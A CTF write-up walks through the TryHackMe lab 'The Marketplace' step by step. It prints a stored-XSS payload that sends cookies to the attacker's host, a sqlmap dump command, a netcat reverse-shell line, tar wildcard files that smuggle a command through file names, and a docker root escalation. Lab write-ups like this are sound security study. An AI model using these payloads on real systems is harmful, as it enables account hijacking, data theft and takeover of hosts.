# CTF Write-up: The Marketplace — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | The Marketplace |
| **Difficulty** | Medium |
| **Tags**       | `XSS` `Cookie Stealing` `SQLi` `Tar Wildcard` `Docker` |

---

## Introduction

The Marketplace is a medium-level box that puts four significant web security concepts into a single chain: stored XSS, cookie theft, SQL injection, and Docker-based privilege escalation. Each layer builds on the last in a way that feels like a real-world attack scenario more than a CTF puzzle. Highly recommended for anyone studying web security.

---

## Step 1 — Reconnaissance (Nmap)

Full port scan first:

```bash
nmap -sC -sV -p- -oN nmap_scan.txt <target-ip>
```

Three open ports:

- **Port 22** — SSH
- **Port 80** — HTTP (Nginx)
- **Port 32768** — HTTP (Node.js)

Port 80 was the main target. The `robots.txt` file, flagged in the scan results, had one disallowed entry: `/admin`. The Node.js server on 32768 appeared to mirror the main site.

---

## Step 2 — Web Application Enumeration & Stored XSS

Browsing to port 80 revealed a simple online marketplace. I created an account, logged in, and started exploring. There was a feature to create new listings with a title and description, and another to report listings to the admins.

Testing the description field for XSS:

```html
<script>alert(1)</script>
```

The alert popped when viewing the listing. Stored XSS — the script was being written to the database and executing for anyone who viewed the page. More importantly, the site set session cookies on login. If we could get the admin to view a malicious listing, we could steal their cookie.

---

## Step 3 — Stealing the Admin Cookie

I started an HTTP server on my attack machine to capture incoming requests, then crafted a cookie-stealing payload in the listing description:

```html
<script>
document.location='http://<your-ip>:8000/steal?c='+document.cookie
</script>
```

Created the listing, then reported it to the admins using the reporting feature. The admin viewed the listing and my HTTP server caught the incoming request carrying their session cookie.

Replaced my own cookie with the stolen admin cookie in the browser (Firefox Storage Inspector works perfectly for this), refreshed the page, and found myself logged in as admin.

The admin panel displayed all users and the first flag.

---

## Step 4 — SQL Injection (Admin Panel)

The admin panel URL changed to `/admin?user=2` when viewing a user. That integer parameter looked injectable. Testing with a single quote:

```
/admin?user=2'
```

Produced a database error — SQL injection confirmed.

I used sqlmap to extract the full database (needed a delay flag to work around potential anti-CSRF measures):

```bash
sqlmap "http://<target-ip>/admin?user=2" --cookie="token=<admin-cookie>" --technique=U --delay=2 --dump
```

sqlmap dumped three tables. The usernames and password hashes were there but cracking them turned out to be a dead end. What actually mattered was the `messages` table — inside it was a message to user Jake (user 3) informing him that his SSH password had been reset to a temporary value, with the new password included in the message.

SSH credentials extracted. Time to get in.

---

## Step 5 — SSH as Jake

```bash
ssh jake@<target-ip>
```

Grabbed the user flag from his home directory:

```bash
cat /home/jake/user.txt
```

> **FLAG:** `[user flag here]`

Michael's home directory was also visible. That would matter shortly.

---

## Step 6 — Pivoting to Michael (Tar Wildcard Injection)

```bash
sudo -l
```

Jake could run `/opt/backups/backup.sh` as the user `michael` without a password. Looking at the script:

```bash
tar cf /opt/backups/backup.tar *
```

It used `tar` with a wildcard. A well-known technique: tar processes checkpoint arguments if files with those names exist in the directory. We can abuse this to execute arbitrary commands.

Generated a reverse shell payload with msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=<your-ip> lport=4444 R
```

Created the necessary files in `/opt/backups/`:

```bash
echo "mkfifo /tmp/uvity; nc <your-ip> 4444 0</tmp/uvity | /bin/sh >/tmp/uvity 2>&1; rm /tmp/uvity" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

Set up a Netcat listener, then ran the script as Michael:

```bash
sudo -u michael /opt/backups/backup.sh
```

Michael's shell connected back.

---

## Step 7 — Privilege Escalation to Root (Docker)

Michael turned out to be a member of the `docker` group. Listing running containers confirmed the Alpine image was available.

GTFOBins has the docker escalation right there:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

That mounts the entire host filesystem into the container and drops us into a root shell with access to everything.

```bash
whoami
# root

cat /root/root.txt
```

> **FLAG:** `[root flag here]`

---

## Summary & Takeaways

Four distinct steps, each building on the last:

1. Stored XSS in listing description to steal the admin's cookie.
2. SQLi on the admin panel to extract SSH credentials from messages.
3. Tar wildcard injection to pivot from jake to michael.
4. Docker group membership for a trivial root escalation.

The Marketplace is a great reminder of how chaining smaller, contained vulnerabilities can lead to full system compromise. No single step was devastating alone — together, they were devastating.
